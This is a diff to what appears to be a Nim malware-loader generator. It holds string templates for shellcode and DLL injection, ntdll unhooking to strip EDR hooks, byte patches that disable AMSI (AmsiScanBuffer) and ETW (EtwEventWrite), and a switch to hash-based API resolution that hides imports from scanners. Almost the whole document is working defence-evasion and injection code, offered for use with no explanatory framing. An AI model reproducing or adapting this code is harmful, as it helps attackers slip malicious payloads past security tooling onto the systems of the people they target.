@@ -1,6 +1,33 @@
 import strformat
 import strutils
 
+let HellsgateDInvokeBaseStub * = """
+
+const
+  KERNEL32_DLL* = obf("kernel32.dll")
+
+type
+  GetCurrentProcess_t* = proc (): DWORD {.stdcall.}
+  GetCurrentProcessId_t* = proc (): DWORD {.stdcall.}
+  OpenProcess_t* = proc (dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, dwProcessId: DWORD): HANDLE {.stdcall.}
+
+const
+  GetCurrentProcessId_HASH * = 1510184040
+  GetCurrentProcess_HASH * = 4140327883
+  OpenProcess_HASH * = 3768626
+
+var MyGetCurrentProcess*: GetCurrentProcess_t
+var MyGetCurrentProcessId*: GetCurrentProcessId_t
+var MyOpenProcess*: OpenProcess_t
+
+MyGetCurrentProcess = cast[GetCurrentProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcess_HASH, 0, FALSE)))
+
+MyGetCurrentProcessId = cast[GetCurrentProcessId_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcessId_HASH, 0, FALSE)))
+
+MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
+
+"""
+
 let HellsgateAllocDelegate*  = """
 
 proc NtAllocateVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
@@ -121,14 +148,12 @@ var
 
 let HellsgateUnhookStub * = """
 
-from winim import MODULEINFO, GetModuleInformation
-
 proc ntdllunhook(): bool =
   let low: uint16 = 0
   var 
-      processH = GetCurrentProcess()
+      processH = MyGetCurrentProcess()
       mi : MODULEINFO
-      ntdllModule = GetModuleHandleA(obf("ntdll.dll"))
+      ntdllModule = MyGetModuleHandleA(obf("ntdll.dll"))
       ntdllBase : LPVOID
       ntdllFile : FileHandle
       ntdllMapping : HANDLE
@@ -137,22 +162,20 @@ proc ntdllunhook(): bool =
       hookedNtHeader : PIMAGE_NT_HEADERS
       hookedSectionHeader : PIMAGE_SECTION_HEADER
 
-  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
+  discard MyGetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
   ntdllBase = mi.lpBaseOfDll
   ntdllFile = getOsFileHandle(open(obf("C:\\windows\\system32\\ntdll.dll"),fmRead))
-  ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
+  ntdllMapping = MyCreateFileMappingA(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
   if ntdllMapping == 0:
     echo obf("Could not create file mapping object ") &  fmt"({GetLastError()})."
     return false
-  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
+  ntdllMappingAddress = MyMapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
   if ntdllMappingAddress.isNil:
     echo obf("Could not map view of file ") & fmt"({GetLastError()})."
     return false
   hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
   hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
   var status = 0
-       
-
   for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
       hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
       if ".text" in toString(hookedSectionHeader.Name):
@@ -192,7 +215,7 @@ proc ntdllunhook(): bool =
   status = NtClose(processH)
   status = NtClose(ntdllFile)
   status = NtClose(ntdllMapping)
-  FreeLibrary(ntdllModule)
+  discard MyFreeLibrary(ntdllModule)
   return true
 
 
@@ -209,8 +232,8 @@ proc pwndemHellsGateLike[byte](friendlycode: openarray[byte]): void =
 
     when defined(amd64):
 
-        let tProcess = GetCurrentProcessId()
-        var pHandle: HANDLE = getCurrentProcess()
+        let tProcess = MyGetCurrentProcessId()
+        var pHandle: HANDLE = MyGetCurrentProcess()
         
         var 
             status          : NTSTATUS          = 0x00000000
@@ -295,7 +318,7 @@ proc remoteLoadLib(var processID: DWORD): void =
         addr bytesWritten
     )
     
-    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle(r"Kernel32.dll"), r"LoadLibraryA"));
+    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandle(r"Kernel32.dll"), r"LoadLibraryA"));
  
     echo "[*] WriteProcessMemory: ", bool(wSuccess)
     echo "    \\-- bytes written: ", bytesWritten
@@ -397,7 +420,7 @@ proc remoteLoadLib(var processID: DWORD): void =
         addr bytesWritten
     )
     
-    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle(r"Kernel32.dll"), r"LoadLibraryA"));
+    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandle(r"Kernel32.dll"), r"LoadLibraryA"));
  
     echo "[*] WriteProcessMemory: ", bool(wSuccess)
     echo "    \\-- bytes written: ", bytesWritten
@@ -462,7 +485,7 @@ let HellsgateAMSIPatchStub*  = """
 
 proc PatchAmsi(): bool =
     var
-        amsi: LibHandle
+        amsi: HMODULE
         cs: pointer
         op: ULONG
         t: ULONG
@@ -472,14 +495,12 @@ proc PatchAmsi(): bool =
         let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
     elif defined i386:
         let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
-    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
-    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
-    amsi = loadLib(obf("amsi"))
-    if isNil(amsi):
+    amsi = MyLoadLibraryA(obf("amsi.dll"))
+    if (amsi == 0):
         echo obf("[X] Failed to load amsi.dll")
         return disabled
 
-    cs = amsi.symAddr(obf("AmsiScanBuffer")) # equivalent of GetProcAddress()
+    cs = MyGetProcAddress(amsi,obf("AmsiScanBuffer"))
     if isNil(cs):
         echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
         return disabled
@@ -490,7 +511,7 @@ proc PatchAmsi(): bool =
     var protectAddress = cs
     var friendlycodeLength = cast[SIZE_T](patch.len)
 
-    var pHandle: HANDLE = getCurrentProcess()
+    var pHandle: HANDLE = MyGetCurrentProcess()
         
     var 
         status          : NTSTATUS          = 0x00000000
@@ -554,7 +575,7 @@ let HellsgateETWPatchStub*  = """
 
 proc Patchntdll(): bool =
     var
-        ntdll: LibHandle
+        ntdll: HMODULE
         cs: pointer
         op: ULONG
         t: ULONG
@@ -564,14 +585,12 @@ proc Patchntdll(): bool =
         let patch: array[1, byte] = [byte 0xc3]
     elif defined i386:
         let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
-    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
-    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
-    ntdll = loadLib(obf("ntdll"))
-    if isNil(ntdll):
+    ntdll = MyLoadLibraryA(obf("ntdll"))
+    if (ntdll == 0):
         echo obf("[X] Failed to load ntdll.dll")
         return disabled
 
-    cs = ntdll.symAddr(obf("EtwEventWrite")) # equivalent of GetProcAddress()
+    cs = MyGetProcAddress(ntdll,obf("EtwEventWrite"))
     if isNil(cs):
         echo obf("[X] Failed to get the address of 'EtwEventWrite'")
         return disabled
@@ -583,7 +602,7 @@ proc Patchntdll(): bool =
     var friendlycodeLength = cast[SIZE_T](patch.len)
 
     let tProcess = GetCurrentProcessId()
-    var pHandle: HANDLE = getCurrentProcess()
+    var pHandle: HANDLE = MyGetCurrentProcess()
         
     var 
         status          : NTSTATUS          = 0x00000000
@@ -669,8 +688,8 @@ proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =
 
 let HellsShellcoderemoteinjectStub * = """
     
-    let tProcess2 = GetCurrentProcessId()
-    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+    let tProcess2 = MyGetCurrentProcessId()
+    var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
 
 
     var oldProtection: DWORD = 0
@@ -919,7 +938,7 @@ proc fixIAT*(modulePtr: PVOID): bool =
         elif((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG64) != 0):
           boolvar = true
         if (boolvar):
-          var libaddr: size_t = cast[size_t](GetProcAddress(LoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
+          var libaddr: size_t = cast[size_t](MyGetProcAddress(MyLoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
           fieldThunk.u1.Function = ULONGLONG(libaddr)
         if fieldThunk.u1.Function == 0:
           break
@@ -931,8 +950,8 @@ proc fixIAT*(modulePtr: PVOID): bool =
           var func_name: LPCSTR = cast[LPCSTR](addr byname.Name)
           
           let asd = byname.Name
-          var hmodule: HMODULE = LoadLibraryA(libname)
-          var libaddr: csize_t = cast[csize_t](GetProcAddress(hmodule,func_name))
+          var hmodule: HMODULE = MyLoadLibraryA(libname)
+          var libaddr: csize_t = cast[csize_t](MyGetProcAddress(hmodule,func_name))
           
     
           fieldThunk.u1.Function = ULONGLONG(libaddr)
@@ -944,8 +963,8 @@ proc fixIAT*(modulePtr: PVOID): bool =
 
 proc pwndem(): void =
 
-    let tProcess2 = GetCurrentProcessId()
-    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+    let tProcess2 = MyGetCurrentProcessId()
+    var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
     
     var shellcodePtr: ptr = dectext[0].addr
 
